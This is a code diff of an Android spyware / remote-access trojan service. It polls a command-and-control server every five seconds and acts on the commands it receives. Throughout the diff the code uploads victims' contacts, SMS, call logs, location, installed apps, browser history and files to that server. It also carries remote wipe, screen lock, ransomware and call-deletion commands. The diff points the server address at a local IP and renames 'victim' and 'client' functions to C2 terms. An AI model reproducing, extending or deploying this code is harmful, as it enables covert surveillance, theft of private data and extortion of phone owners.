@@ -12,12 +12,9 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.ContextWrapper;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
-import android.database.Cursor;
 import android.location.Location;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
@@ -25,7 +22,6 @@ import android.os.SystemClock;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
 import android.provider.CallLog;
-import android.provider.ContactsContract;
 import android.speech.tts.TextToSpeech;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
@@ -77,7 +73,8 @@ import me.everything.providers.android.telephony.TelephonyProvider;
 public class InternalService extends Service implements TextToSpeech.OnInitListener {
 
     public Context context;
-    private String SERVER_URI = "https://your-direct-url/commands.php";
+    // private String SERVER_URI = "https://nubidus.com/public/commands.php";
+    private String SERVER_URI = "http://192.168.1.24/public/commands.php";
     private Timer timerTaskScheduler = new Timer();
     private LocationTracker tracker = null;
     private String deviceUniqueId = null;
@@ -182,7 +179,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
         EasyMemoryMod easyMemoryMod = new EasyMemoryMod(context);
         postData.put("total_ram", easyMemoryMod.convertToGb(easyMemoryMod.getTotalRAM()) + "");
-        createVictimIntoClient(postData);
+        addDeviceToCC(postData);
     }
 
     private void checkCmdFromServer() {
@@ -190,7 +187,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         timerTaskScheduler.schedule(new TimerTask() {
             @Override
             public void run() {
-                checkCommandRequests();
+                checkCommands();
             }
 
         }, 0, 5000);
@@ -207,7 +204,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         postData.put("device_id", deviceUniqueId);
         postData.put("contact_list", json);
 
-        sendPostRequestsToClient(postData);
+        sendPostRequestsToCC(postData);
     }
 
     private void getSMSContent() {
@@ -217,10 +214,10 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("sms_list", json);
-        sendPostRequestsToClient(postData);
+        sendPostRequestsToCC(postData);
     }
 
-    private void sendPostRequestsToClient(HashMap<String, Object> postData) {
+    private void sendPostRequestsToCC(HashMap<String, Object> postData) {
         AndroidNetworking.post(SERVER_URI)
                 .addBodyParameter(postData)
                 .build()
@@ -254,7 +251,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     }
 
 
-    private void createVictimIntoClient(HashMap<String, String> hashMap) {
+    private void addDeviceToCC(HashMap<String, String> hashMap) {
         AndroidNetworking.post(SERVER_URI)
                 .addBodyParameter(hashMap)
                 .setTag("addDevice")
@@ -264,12 +261,15 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
                 .getAsJSONObject(new JSONObjectRequestListener() {
                     @Override
                     public void onResponse(JSONObject response) {
+                        showAllData(response.toString());
                     }
 
                     @Override
                     public void onError(ANError anError) {
+                        showAllData(anError.getErrorDetail());
                     }
-                });
+                }
+                );
     }
 
     private void showAllData(String data) {
@@ -288,78 +288,75 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
     }
 
-    private void getCommandType(JSONObject response){
-
-        if (response.has("rehber_oku")) {
-            getPhoneContact();
-        }
-
-        if (response.has("sms_oku")) {
-            getSMSContent();
-        }
-
-        if (response.has("send_sms")) {
-            sendSms(response);
-        }
-
-        if (response.has("device_info")) {
-            getDeviceInfo();
-        }
-
-        if (response.has("location_tracker")) {
-            prepareLocationdata();
-        }
-
-        if (response.has("arama_gecmisi")) {
-            getCallLog();
-        }
-
-        if (response.has("screen_message")) {
-            screenMessage(response);
-        }
-        if (response.has("wipe")) {
-            wipe(response);
-        }
-        if (response.has("LockTheScreen")) {
-            LockTheScreen(response);
-        }
-        if (response.has("changewallpaper")) {
-            changewallpaper(response);
-        }
-        if (response.has("ransomware")) {
-            ransomware(response);
-        }
-        if (response.has("vibrate")) {
-            swagkarnaloveshandeercel(response);
-        }
-        if (response.has("deletecalls")) {
-            handelovesswag(response);
-        }
-        if (response.has("voice_message")) {
-            startVoiceMessage(response);
-        }
-
-        if (response.has("get_list_file")) {
-            getListFile(response);
-        }
-
-        if (response.has("upload_file_path")) {
-            uploadFile(response);
-        }
-
-        if (response.has("application_list")) {
-            getApplist();
-        }
-
-        if (response.has("browser_history")) {
-            getBrowserHistory();
-        }
-        if (response.has("get_screenshot")) {
-            //getScreenshot();
+    private void triageCommand(JSONObject response) throws JSONException {
+        if (response.has("command")) {
+            JSONObject commandObject = new JSONObject(response.getJSONObject("command").toString());
+            String commandName = commandObject.getString("name");
+            switch (commandName) {
+                case "read_contacts":
+                    getPhoneContact();
+                    break;
+                case "read_sms":
+                    getSMSContent();
+                    break;
+                case "send_sms":
+                    sendSms(response);
+                    break;
+                case "device_info":
+                    getDeviceInfo();
+                    break;
+                case "location_tracker":
+                    prepareLocationdata();
+                    break;
+                case "call_logs":
+                    getCallLog();
+                    break;
+                case "screen_message":
+                    screenMessage(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "wipe":
+                    wipe(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "lock_the_screen":
+                    lockTheScreen(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "changeBackground":
+                    changeBackground(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "ransomware":
+                    ransomware(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "vibrate":
+                    swagkarnaloveshandeercel(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "delete_calls":
+                    handelovesswag(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "voice_message":
+                    startVoiceMessage(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "get_list_file":
+                    getListFile(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "upload_file_path":
+                    uploadFile(new JSONObject(commandObject.getString("value")));
+                    break;
+                case "application_list":
+                    getApplicationList();
+                    break;
+                case "browser_history":
+                    getBrowserHistory();
+                    break;
+                // case "get_screenshot" : getScreenshot();
+                // break;
+                default:
+                    getDeviceInfo();
+                    break;
+            }
         }
     }
 
-    private void checkCommandRequests() {
+    private void checkCommands() {
         HashMap<String, String> hashMap = new HashMap<>();
         hashMap.put("device_id", deviceUniqueId);
         hashMap.put("check_cmd", "true");
@@ -370,8 +367,12 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
                 .getAsJSONObject(new JSONObjectRequestListener() {
                     @Override
                     public void onResponse(JSONObject response) {
-                        showAllData("RESPONSE" + response.toString());
-                        getCommandType(response);
+                        showAllData("RESPONSE: " + response.toString());
+                        try {
+                            triageCommand(response);
+                        } catch (JSONException e) {
+                            e.printStackTrace();
+                        }
                     }
 
                     @Override
@@ -390,11 +391,11 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("browser_history", json);
-        sendPostRequestsToClient(postData);
+        sendPostRequestsToCC(postData);
 
     }
 
-    private void getApplist() {
+    private void getApplicationList() {
         final PackageManager pm = getPackageManager();
         List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
         HashMap<String, Object> appIndexMap = new HashMap<>();
@@ -412,7 +413,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("app_list", base64);
-        sendPostRequestsToClient(postData);
+        sendPostRequestsToCC(postData);
     }
 
     private void uploadFile(JSONObject jsonObject) {
@@ -452,11 +453,9 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     }
 
     private void getListFile(JSONObject jsonObject) {
-        JSONObject object;
         String targetFilePath = null;
         try {
-            object = new JSONObject(jsonObject.get("get_list_file").toString());
-            targetFilePath = object.getString("target_file_path").trim();
+            targetFilePath = jsonObject.getString("target_file_path").trim();
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -490,7 +489,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
             postData.put("device_id", deviceUniqueId);
             postData.put("get_file_list", base64);
-            sendPostRequestsToClient(postData);
+            sendPostRequestsToCC(postData);
         }
 
 
@@ -499,9 +498,8 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     private void startVoiceMessage(JSONObject jsonObject) {
         String langType = null, msgContent = null;
         try {
-            JSONObject voiceContent = new JSONObject(jsonObject.get("voice_message").toString());
-            langType = voiceContent.getString("message_type");
-            msgContent = voiceContent.getString("message_content");
+            langType = jsonObject.getString("message_type");
+            msgContent = jsonObject.getString("message_content");
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -543,9 +541,8 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
 
         String messageType = null, messageContent = null;
         try {
-            JSONObject msgObject = new JSONObject(jsonObject.getJSONObject("screen_message").toString());
-            messageType = msgObject.get("message_type").toString() + "";
-            messageContent = msgObject.get("message_content").toString() + "";
+            messageType = jsonObject.get("message_type").toString() + "";
+            messageContent = jsonObject.get("message_content").toString() + "";
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -584,7 +581,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         wipingSdcard();
 
     }
-    private void LockTheScreen(JSONObject jsonObject) {
+    private void lockTheScreen(JSONObject jsonObject) {
         ComponentName localComponentName = new ComponentName(this, DeviceAdminComponent.class);
         DevicePolicyManager localDevicePolicyManager = (DevicePolicyManager)this.getSystemService(Context.DEVICE_POLICY_SERVICE );
         if (localDevicePolicyManager.isAdminActive(localComponentName))
@@ -597,7 +594,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
     }
 
     @SuppressLint("ResourceType")
-    private  void changewallpaper(JSONObject jsonObject){
+    private  void changeBackground(JSONObject jsonObject){
         WallpaperManager myWallpaperManager
                 = WallpaperManager.getInstance(getApplicationContext());
 
@@ -642,7 +639,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
         HashMap<String, Object> postData = new HashMap<>();
         postData.put("device_id", deviceUniqueId);
         postData.put("call_log_history", json);
-        sendPostRequestsToClient(postData);
+        sendPostRequestsToCC(postData);
     }
 
     @SuppressLint("MissingPermission")
@@ -655,7 +652,7 @@ public class InternalService extends Service implements TextToSpeech.OnInitListe
             postData.put("location_update", "true");
             postData.put("x_axis", locationDataClass.getLatitude + "a");
             postData.put("y_axis", locationDataClass.getLongitude + "a");
-            sendPostRequestsToClient(postData);
+            sendPostRequestsToCC(postData);
         }
 
 
